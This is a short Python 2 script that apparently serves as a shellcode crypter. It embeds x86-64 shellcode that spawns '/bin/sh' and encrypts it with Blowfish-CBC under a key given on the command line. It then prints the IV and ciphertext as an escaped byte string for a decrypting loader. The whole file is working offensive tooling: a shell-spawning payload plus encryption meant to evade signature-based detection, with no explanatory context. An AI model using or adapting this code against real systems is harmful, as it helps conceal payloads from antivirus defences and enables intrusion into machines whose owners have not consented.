#!/usr/bin/python
import sys
from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack

bs = Blowfish.block_size
key = b'%s'%sys.argv[1]
iv = Random.new().read(bs)
cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
plaintext = b'\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
plen = bs - len(plaintext) % bs
padding = [plen]*plen
padding = pack('b'*plen, *padding)
enc = iv + cipher.encrypt(plaintext + padding)
encrypt = ""

for x in bytearray(enc):
  encrypt += '\\x'
  enc = '%02x' % x
  encrypt += enc  
 
print encrypt
